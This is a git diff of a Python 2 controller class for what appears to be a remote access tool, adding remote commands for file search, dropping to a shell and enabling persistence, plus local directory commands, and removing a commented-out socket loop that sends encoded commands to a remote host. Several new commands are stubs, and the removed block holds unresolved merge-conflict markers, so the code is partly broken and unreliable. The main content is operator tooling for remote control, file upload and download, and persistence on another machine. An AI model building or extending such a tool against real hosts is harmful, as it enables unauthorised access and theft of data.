@@ -22,8 +22,11 @@ class CrispyController:
             download           - download [src absolute path] [dest absolute path]
             upload             - upload [src absolute path] [dest absolute path]
             enable_persistence - make py persistent through reboots
+            search             - search for files matching a given regular expression
+            shell              - drop to a shell
         Local commands:
-            pwd                - print current working directory
+            lcd                - change local directory
+            lpwd               - print current working directory
             session            - show info about current session
             exit               - close down connection to remote host
         """
@@ -73,9 +76,22 @@ class CrispyController:
                 if cmd == '-h' or cmd == 'help':
                     print self.help_menu()
                 elif cmd == 'session':
-                    pass
-                elif cmd == 'pwd':
+                    print "need to implement"
+                elif cmd.startswith('lcd'):
+                    args = cmd.split(' ')
+
+                    if len(args) == 2 and os.path.isdir(args[1]):
+                        os.chdir(args[1])
+                    else:
+                        print "[!] Usage is \"lcd /new/path\"\n"
+                elif cmd == 'lpwd':
                     print "{0}\n".format(os.getcwd())
+                elif cmd.startswith("search"):
+                    print "need to implement"
+                elif cmd == "shell":
+                    print "need to implement"
+                elif cmd == "enable_persistence":
+                    print "need to implement"
                 elif cmd.startswith('download'):
                     saveMeFile = cmd[9:].split(' ')[1]
                     print "[-] Attempting download of " + cmd[9:].split(' ')[0] + "..."
@@ -106,62 +122,3 @@ class CrispyController:
             print "[!] Controller run() --> {0}".format(e)
         finally:
             sys.exit(0)
-# 
-# def spawn():
-#     try:
-#         sock.connect((TCP_IP, TCP_PORT))
-#         print BANNER
-#         
-#         while True:
-#             cmd = raw_input(PROMPT).strip()
-#              
-#             if cmd == '-h' or cmd == 'help':
-#                 print help_menu()
-#             elif cmd == 'session':
-#                 print get_session_info()
-#             elif cmd.startswith('download'):
-#                 print "[+] Downloading " + cmd[9:].split(' ')[0] + "..."
-#                 sock.sendall(cipher.encode(cmd + "\n"))
-#                 
-#                 if receiveFile(cmd[9:].split(' ')[1]):
-#                     print "[+] File transfer complete!\n"
-#                 else:
-#                     print "[!] File transfer failed.\n"
-#             elif cmd.startswith('upload'): #do I need to md5 the file before and after to determine success?
-#                 sendMeFile = cmd[7:].split(' ')[0]
-#                 print "[+] Uploading " + sendMeFile + "..."
-#                 
-#                 sock.sendall(cipher.encode(cmd + "\n"))
-#                 
-#                 if uploadFile(sendMeFile):
-#                     print "[+] File transfer complete!\n"
-#                 else:
-#                     print "[!] File transfer failed.\n"
-#             elif cmd == 'exit' or cmd == 'quit':
-#                 sock.shutdown('SHUT_WR') #does this need to be encoded?
-#                 sock.close()
-#                 break
-#             else:
-# <<<<<<< Updated upstream
-#                 sock.sendall(cipher.encode(cmd + "\n"))
-#                 data = cipher.decode(sock.recv(BUFFER_SIZE))
-#                 print data
-#     except Exception as e:
-#         print e
-#         print "Couldn't connect to " + TCP_IP
-#     finally:
-#         sys.exit(0)
-# =======
-#                 print "[!] File transfer failed.\n"
-#         elif cmd == 'exit' or cmd == 'quit':
-#             sock.shutdown('SHUT_WR') #does this need to be encoded?
-#             sock.close()
-#             break
-#         else:
-#             sock.sendall(cipher.encode(cmd + "\n"))
-#             data = cipher.decode(sock.recv(BUFFER_SIZE))
-#             print data
-# except:
-#     print "Couldn't connect to " + TCP_IP
-# finally:
-#     sock.close()
